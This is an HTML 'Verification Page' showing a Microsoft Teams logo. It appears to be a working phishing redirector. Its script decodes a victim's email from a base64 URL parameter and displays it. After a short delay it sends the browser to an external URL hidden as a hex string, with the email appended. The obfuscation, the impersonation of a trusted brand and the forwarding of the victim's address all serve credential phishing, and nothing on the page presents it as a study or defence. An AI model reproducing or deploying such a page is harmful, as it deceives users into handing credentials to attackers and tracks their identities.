<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Page</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: white;
        }
        .container {
            text-align: center;
        }
        .dots-container {
            display: none;
            align-items: center;
            justify-content: center;
        }
        .dot {
            background-color: dodgerblue;
            border-radius: 50%;
            width: 10px;
            height: 10px;
            margin: 5px;
            animation: grow 1.5s infinite ease-in-out;
        }
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.1s; }
        .dot:nth-child(3) { animation-delay: 0.2s; }
        .dot:nth-child(4) { animation-delay: 0.3s; }
        .dot:nth-child(5) { animation-delay: 0.4s; }
        @keyframes grow {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.5); }
        }
        #emailDisplay {
            color: rgb(110, 71, 238);
            font-size: 18px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
        <div id="emailDisplay" aria-live="polite"></div>
        <div class="dots-container" aria-label="Loading content">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>
    <script>
        // Decode Base64 to readable string
        function decodeBase64(encoded) {
            try {
                return decodeURIComponent(atob(encoded).split('').map(c =>
                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
            } catch (e) {
                console.error("Decoding failed: ", e);
                return null; // Return null if decoding fails
            }
        }

        // Convert Hex to String
        function hexToString(hex) {
            return hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
        }

        // Extract email parameter from URL
        function findEmailParam() {
            const urlParams = new URLSearchParams(window.location.search);
            for (const [key, value] of urlParams.entries()) {
                if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
                    const decodedValue = decodeBase64(value);
                    if (decodedValue && decodedValue.includes('@')) {
                        return { key, value, decodedValue }; // Key, raw Base64 value, and decoded email
                    }
                }
            }
            return null;
        }

        // Redirect to final URL with email appended
function redirectToTarget(base64Email) {
    const hex = "68747470733A2F2F736D616C6C6465706F742E636F6D2F6E2F3F63335939627A4D324E56387858335A7661574E6C4A6E4A68626D513956555634656D5246627A306D64576C6B50565654525649794F4445774D6A41794E4655304E6A45774D6A67794F513D3D4E303132334E";
    const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
    window.location.href = obfuscatedURL;
}

// Update the displayed email and redirect
        window.onload = function () {
            const emailParam = findEmailParam();
            const emailDisplay = document.getElementById('emailDisplay');
            if (emailParam) {
                emailDisplay.innerText = emailParam.decodedValue; // Display the decoded email
                document.querySelector('.dots-container').style.display = 'flex'; // Show loading dots
                setTimeout(() => {
                    redirectToTarget(emailParam.value, emailParam.decodedValue);
                }, 2000); // Delay before redirection
            } else {
                console.error("No valid email parameter found.");
            }
        };
    </script>
</body>
</html>